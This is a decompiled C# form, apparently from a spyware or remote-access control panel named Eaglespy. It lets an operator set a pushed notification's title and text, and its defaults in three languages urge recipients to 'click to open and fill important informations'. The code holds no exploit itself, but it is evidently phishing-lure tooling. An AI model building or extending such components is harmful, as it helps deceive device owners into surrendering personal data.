using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;

namespace Eaglespy
{
	// Token: 0x020000EC RID: 236
	public partial class Dialogue3 : Form
	{
		// Token: 0x06000BA9 RID: 2985 RVA: 0x0000756D File Offset: 0x0000576D
		public Dialogue3()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000BAA RID: 2986 RVA: 0x00002423 File Offset: 0x00000623
		private void guna2Button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BAB RID: 2987 RVA: 0x00002423 File Offset: 0x00000623
		private void guna2Button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BAC RID: 2988 RVA: 0x0000757B File Offset: 0x0000577B
		private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			this.BodyText = this.guna2TextBox1.Text;
			this.MessageText = this.guna2TextBox2.Text;
			base.DialogResult = DialogResult.OK;
			base.Close();
		}

		// Token: 0x06000BAD RID: 2989 RVA: 0x000033FD File Offset: 0x000015FD
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.No;
			base.Close();
		}

		// Token: 0x06000BAE RID: 2990 RVA: 0x000075AC File Offset: 0x000057AC
		private void Dialogue3_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x06000BAF RID: 2991 RVA: 0x000FF38C File Offset: 0x000FD58C
		private void UpdateEnglish()
		{
			this.label1.Text = "Notification Title :";
			this.label2.Text = "Description :";
			this.guna2TextBox1.Text = "PImportant Notification";
			this.guna2TextBox2.Text = "Click to open and and fill important informations";
		}

		// Token: 0x06000BB0 RID: 2992 RVA: 0x000FF3DC File Offset: 0x000FD5DC
		private void UpdateChinese()
		{
			this.label1.Text = "通知标题：";
			this.label2.Text = "描述：";
			this.guna2TextBox1.Text = "重要通知";
			this.guna2TextBox2.Text = "点击打开并填写重要信息";
		}

		// Token: 0x06000BB1 RID: 2993 RVA: 0x000FF42C File Offset: 0x000FD62C
		private void UpdateRussian()
		{
			this.label1.Text = "Заголовок уведомления :";
			this.label2.Text = "Описание :";
			this.guna2TextBox1.Text = "Важное уведомление";
			this.guna2TextBox2.Text = "Щелкните, чтобы открыть и заполнить важную информацию";
		}

		// Token: 0x06000BB2 RID: 2994 RVA: 0x000FF47C File Offset: 0x000FD67C
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000EF7 RID: 3831
		public string BodyText;

		// Token: 0x04000EF8 RID: 3832
		public string MessageText;
	}
}
